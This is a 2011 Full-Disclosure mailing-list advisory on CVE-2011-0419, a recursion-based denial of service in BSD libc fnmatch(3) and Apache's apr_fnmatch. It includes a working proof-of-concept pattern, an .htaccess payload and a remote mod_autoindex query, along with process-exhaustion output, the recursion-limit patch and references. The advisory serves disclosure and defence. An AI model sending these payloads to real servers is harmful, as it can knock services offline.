@@ -1,0 +1,347 @@
+
+Date: Fri, 13 May 2011 00:52:17 +0200
+From: Maksymilian Arciemowicz <cxib@...urityreason.com>
+To: full-disclosure@...ts.grok.org.uk
+Subject: Multiple Vendors libc/fnmatch(3) DoS (incl apache
+	poc)
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+[ Multiple Vendors libc/fnmatch(3) DoS (incl apache poc) ]
+
+Author: Maksymilian Arciemowicz
+http://netbsd.org/donations/
+http://securityreason.com/
+http://cxib.net/
+
+Date:
+- - Dis.: 29.01.2011
+- - Pub.: 13.05.2011
+
+CVE: CVE-2011-0419
+CWE: CWE-399
+
+Affected Software (verified):
+- - Apache 2.2.17
+- - NetBSD 5.1
+- - OpenBSD 4.8
+- - FreeBSD
+- - MacOSX 10.6
+- - SunSolaris 10
+
+Original URL:
+http://securityreason.com/achievement_securityalert/98
+
+
+- --- 0.Description ---
+fnmatch -- match filename or pathname using shell glob rules
+
+SYNOPSIS
+     #include <fnmatch.h>
+
+     int
+     fnmatch(const char *pattern, const char *string, int flags);
+
+
+- --- 1. Multiple Vendors libc/fnmatch(3) DoS (incl apache poc) ---
+Attacker, what may modify first and second parameters(pattern,string) of
+fnmatch(3), may cause to CPU resource exhaustion. To see problem huge
+complexity, try compile code below:
+
+fnmatch("?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*","xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",0);
+
+fnmatch should return quickly answer, logically int.
+
+- -fnmatch()/netbsd/fnmatch.c--
+			/* Collapse multiple stars. */
+			while (c == '*')
+				c = FOLDCASE(*++pattern, flags);
+- -fnmatch()/netbsd/fnmatch.c--
+
+fnmatch() skip multiple stars here. It protect us before patterns like
+"********************...", but not before "*?*?*?*?*?*?*?*?*?*?*?...".
+Let's see what will happen if we use single star in pattern:
+
+- -fnmatch()/netbsd/fnmatch.c--
+		case '*':
+			c = FOLDCASE(*pattern, flags);
+			/* Collapse multiple stars. */
+			while (c == '*')
+				c = FOLDCASE(*++pattern, flags);
+
+			if (*string == '.' && (flags & FNM_PERIOD) &&
+			    (string == stringstart ||
+			    ((flags & FNM_PATHNAME) && *(string - 1) == '/')))
+				return (FNM_NOMATCH);
+
+...
+
+			/* General case, use recursion. */
+			while ((test = FOLDCASE(*string, flags)) != EOS) {
+				if (!fnmatch(pattern, string, <====================== RECURSION
+					     flags & ~FNM_PERIOD))
+					return (0);
+				if (test == '/' && flags & FNM_PATHNAME)
+					break;
+				++string;
+			}
+			return (FNM_NOMATCH);
+- -fnmatch()/netbsd/fnmatch.c--
+
+Recursion in this code:
+	if (!fnmatch(pattern, string, <=== RECURSION WITHOUT LIMITS
+
+may cause to denial of service. Some recursion limit is missing here.
+Fix has been created together with NetBSD and should work on all BSD's
+implementations of fnmatch(3). To fix it, limit recursion_level to 64,
+because it guaranty quickly result. e.g.
+
+- -fix---
+...
+static int
+fnmatchx(const char *pattern, const char *string, int flags, size_t
+recursion) <=== ADD ( size_t recursion )
+{
+	const char *stringstart;
+	char c, test;
+
+	_DIAGASSERT(pattern != NULL);
+	_DIAGASSERT(string != NULL);
+
+	if (recursion-- == 0) <=== DECREMENT recursion_level
+		return FNM_NORES;
+
+...
+int
+fnmatch(const char *pattern, const char *string, int flags)
+{
+	return fnmatchx(pattern, string, flags, 64); <=== SET recursion_level HERE
+}
+...
+- -fix---
+
+This fix limit max recursion level to 64. Any bigger value, may be unsafe.
+
+To demonstrate this flaws, i'm using apache with mod_autoindex because
+it's best vector here. There are two ways to denial of service, local
+and remote.
+
+IMPORTANT:
+fnmatch(const char *pattern, const char *string, int flags);
+
+strlen(string) should be smaller as strlen(pattern)
+
+let's start
+
+- -apache.2.2.17;apr_fnmatch();srclib/apr/strings/apr_fnmatch.c---
+...
+	    /* Collapse multiple stars. */
+	    while (c == '*') {
+		c = *++pattern;
+	    }
+...
+
+	    /* General case, use recursion. */
+	    while ((test = *string) != EOS) {
+	        if (!apr_fnmatch(pattern, string, flags & ~APR_FNM_PERIOD)) {
+<=== RECURSION
+		    return (APR_SUCCESS);
+...
+- -apache.2.2.17;apr_fnmatch();srclib/apr/strings/apr_fnmatch.c---
+
+This is BSD implementation of fnmatch(3). So the same issue exist in
+NetBSD, OpenBSD etc. Now we need find some code, where apr_fnmtach() is
+used.
+
+- -apache.2.2.17;mod_autoindex.c---
+...
+        /*
+         * Make the comparison using the cheapest method; only do
+         * wildcard checking if we must.
+         */
+        if (tuple->wildcards) {
+            found = (apr_fnmatch(tuple->pattern, filename, MATCH_FLAGS)
+== 0); <=== LOCAL DOS
+        }
+...
+    if (pattern && (apr_fnmatch(pattern, dirent->name, <=== REMOTE DOS
+                                APR_FNM_NOESCAPE | APR_FNM_PERIOD
+#ifdef CASE_BLIND_FILESYSTEM
+                                | APR_FNM_CASE_BLIND
+#endif
+                                )
+                    != APR_SUCCESS)) {
+        return (NULL);
+    }
+...
+- -apache.2.2.17;mod_autoindex.c---
+
+As we can see, in mod_autoindex are two apr_fnmatch() cals.
+
+
+	found = (apr_fnmatch(tuple->pattern, filename, MATCH_FLAGS) == 0); <===
+LOCAL DOS
+
+and
+
+	if (pattern && (apr_fnmatch(pattern, dirent->name, <=== REMOTE DOS
+
+To use the first, we need create some file with long filename e.g.
+
+"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+
+then create .htaccess with 'AddDescription'
+
+AddDescription "fnmatch DoS"
+*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*?*
+
+Result:
+www-data  1816  2.2  0.3 419048  9844 ?        R    18:39   5:39
+/usr/sbin/apache2 -k start
+
+The second possibility to remote denial of service, come when attacked
+servers contain directory with long filename.
+
+http://localhost/?P=*?*?...to.4096
+
+where variable 'P', will be used in {{{apr_fnmatch(pattern,
+dirent->name,}}} as a pattern.
+
+If the filename is to short, of course we can set long pattern e.g. 4096
+chars.
+
+http://localhost/?P=*?*?*?*?*?*....?*?*...to.4096
+
+Apache 2.2.18 fix this problem.
+
+To local attack, use this script written in php and execute it in
+writable directory.
+
+http://cxib.net/stuff/apache.fnmatch.phps
+
+127# httpd -v && uname -a
+Server version: Apache/2.2.17 (Unix)
+Server built:   Dec 28 2010 13:21:44
+NetBSD localhost 5.1 NetBSD 5.1 (GENERIC) #0: Sun Nov  7 14:39:56 UTC
+2010
+builds@...netbsd.org:/home/builds/ab/netbsd-5-1-RELEASE/i386/201011061943Z-obj/home/builds/ab/netbsd-5-1-RELEASE/src/sys/arch/i386/compile/GENERIC
+i386
+127# ls -la
+total 8
+drwxrwxrwx  2 root  wheel   512 Feb  8 21:41 .
+drwxr-xr-x  7 www   wheel  1024 Jan 31 08:49 ..
+- -rw-r--r--  1 www   wheel  1056 Feb  8 19:39 .htaccess
+- -rw-r--r--  1 www   wheel     0 Feb  8 19:39
+cx.............................................................................................................................
+- -rw-r--r--  1 www   wheel  1240 Feb  8 19:42 run.php
+127# ps -aux -p 617
+USER PID %CPU %MEM   VSZ  RSS TTY STAT STARTED      TIME COMMAND
+www  617 98.6  0.4 10028 4004 ?   R     7:38PM 121:43.17
+/usr/pkg/sbin/httpd -k start
+
+Time = 121:43 and counting
+
+In result, we get:
+
+...
+www     2044  0.0  0.4 10028  3932 ?     R     9:49PM 0:20.23
+/usr/pkg/sbin/httpd -k start
+www     2047  0.0  0.4 10028  3932 ?     R     9:49PM 0:19.29
+/usr/pkg/sbin/httpd -k start
+www     2051  0.0  0.4 10028  3924 ?     R     9:50PM 0:19.86
+/usr/pkg/sbin/httpd -k start
+www     2086  0.2  0.4 10028  3936 ?     R     9:49PM 0:19.62
+/usr/pkg/sbin/httpd -k start
+www     2088  0.0  0.4 10028  3936 ?     R     9:49PM 0:19.76
+/usr/pkg/sbin/httpd -k start
+www     2206  0.0  0.4 10028  3948 ?     R     9:50PM 0:20.92
+/usr/pkg/sbin/httpd -k start
+www     2225  0.0  0.4 10028  3944 ?     R     9:50PM 0:20.63
+/usr/pkg/sbin/httpd -k start
+www     2233  0.3  0.4 10028  3948 ?     R     9:49PM 0:19.95
+/usr/pkg/sbin/httpd -k start
+www     2278  0.0  0.4 10028  3924 ?     R     9:50PM 0:18.63
+/usr/pkg/sbin/httpd -k start
+www     2316  0.0  0.4 10028  3924 ?     R     9:50PM 0:19.76
+/usr/pkg/sbin/httpd -k start
+www     2317  0.0  0.4 10028  3924 ?     R     9:50PM 0:19.85
+/usr/pkg/sbin/httpd -k start
+...
+
+cx@...4:~$ telnet 172.11.12.129 80
+Trying 172.11.12.129...
+telnet: Unable to connect to remote host: Connection timed out
+cx@...4:~$
+
+
+- --- 2. Exploit ---
+http://cxib.net/stuff/apr_fnmatch.txt
+
+
+- --- 3. Fix ---
+Fix has been created together with netbsd team and should fix this
+problem in all BSD's implementation of fnmatch(3).
+
+http://cvsweb.netbsd.org/bsdweb.cgi/src/lib/libc/gen/fnmatch.c
+http://www.openbsd.org/cgi-bin/cvsweb/src/lib/libc/gen/fnmatch.c?annotate=1.15
+http://netbsd.org/donations/
+
+
+- --- 4. References ---
+https://rhn.redhat.com/errata/RHSA-2011-0507.html
+http://httpd.apache.org/security/vulnerabilities_22.html
+http://www.apache.org/dist/apr/CHANGES-APR-1.4
+
+http://cwe.mitre.org/data/definitions/399.html
+
+A similar vulnerability based on CWE-399
+http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-0762
+http://securityreason.com/achievement_securityalert/95
+
+
+- --- 5. Greets ---
+Christos Zoulas, sp3x, Infospec
+
+
+- --- 6. Contact ---
+Author: Maksymilian Arciemowicz [ SecurityReason.com ]
+
+Email:
+- - cxib {a\./t] securityreason [d=t} com
+
+GPG:
+- - http://securityreason.com/key/Arciemowicz.Maksymilian.gpg
+
+http://netbsd.org/donations/
+http://securityreason.com/
+http://cxib.net/
+
+- -- 
+Best Regards
+pub   4096R/D6E5B530 2010-09-19
+uid                  Maksymilian Arciemowicz (cx) <max@...b.net>
+sub   4096R/58BA663C 2010-09-19
+-----BEGIN PGP SIGNATURE-----
+
+iQIcBAEBAgAGBQJNzGSgAAoJEIO8+dzW5bUw7vEQAK34H13RZ9Vy/9aTuqFiZBqS
+bV1eWUv+V8uew94NvWAr44/xp2w0UDFK/9bxmjJPi6BtP8W5mLK+R7ocnvZapJ/k
+0Jsl5TFiQjYJXbtVa9izJzDzUwEgfxCiCtpceNuc+u2AZHcJwgPuzhi8Ph5AkVyC
+RGicJ68QoEr/XHDJCg9k5Ca/f+V/ewQjDcZXyd65H43eKUep9hdO6+xOZcmgzXJ0
+lM7jCSFooKxjoePv7zzOlQM9hbK+yP5XfiXaq94AWDcQT9DpnZ3xlL2IqQesf1to
+vhISPtI5YJDqYiG9Fa7Frqgjt8J3xS1jrzBZ4JZ0TMQ2B5HcoHVPdJupranbQC4U
+HvC1HHvme046oDYLS/XlBIBQ/8UhFhom7rudS6re1t/6C0mOD/TGoNZpeYdjckqk
+4TaT4vJE1HlFiaDK/Z3A5smCMhYmBR5ZqQcI0t+x9DErtBm5REPLchAo85On9XIT
+znpSbE7WSmGU00SKksqI0LLoqk0wnl6Undf7Mv5Eb3Vb84fKYOnnCuesF6iIt3Fe
+2aVCNnQ3lOblmTpocRq6f103VQIo0PU95oRI7r1qdo4UTQmAPCZy3SSBTuBE3Cob
+Gmm83eSrypaaZZe6zg5WRTLMMcWvenmQJkBrZBDPzYdc5DVNZGBz1Z+CuItEZOtO
+FNV8g1wZwMSdjBnyOlzn
+=n0u8
+-----END PGP SIGNATURE-----
+
+Download attachment "0xD6E5B530.asc" of type "application/pgp-keys" (3086 bytes)
+
+_______________________________________________
+Full-Disclosure - We believe in it.
+Charter: http://lists.grok.org.uk/full-disclosure-charter.html
+Hosted and sponsored by Secunia - http://secunia.com/
